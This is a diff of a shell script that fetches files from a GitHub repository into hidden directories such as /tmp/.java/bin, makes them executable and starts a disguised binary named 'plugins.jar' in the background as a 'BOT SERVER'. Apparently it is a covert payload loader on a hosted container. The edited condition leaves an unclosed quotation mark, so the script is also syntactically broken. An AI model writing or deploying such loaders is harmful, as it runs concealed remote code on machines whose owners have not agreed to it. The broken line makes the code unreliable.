@@ -7,7 +7,7 @@ function fetch_files() {
     cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/lyla/cdr.conf -o cfg.conf
 
     # CHECK CDR EXISTENCE
-    if [ -f "/tmp/.npm" ]; then
+    if [ -f "/home/container/.npm" ]; then
         echo "files're ready ..."
     else
         cd /home/container/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/ouch -o ouch && chmod a+x ouch
@@ -26,12 +26,10 @@ function fetch_files() {
 function start_app() {
     chmod a+x /tmp/.java/bin/***
     cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
-    sed -i "s/127.0.0.1/0.0.0.0/g" /home/container/.config/code-server/config.yaml
-    ./plugins.jar ctl stop app && ./plugins.jar ctl start app
     echo "BOT SERVER STARTED ..."
 }
 
-if [ -f "/tmp/.npm" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/cfg.conf" ]; then
+if [ -f "/home/container/.npm ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/cfg.conf" ]; then
     echo "Patch files already loaded ..."
     start_app
 else
@@ -39,4 +37,3 @@ else
     fetch_files
     start_app
 fi
-
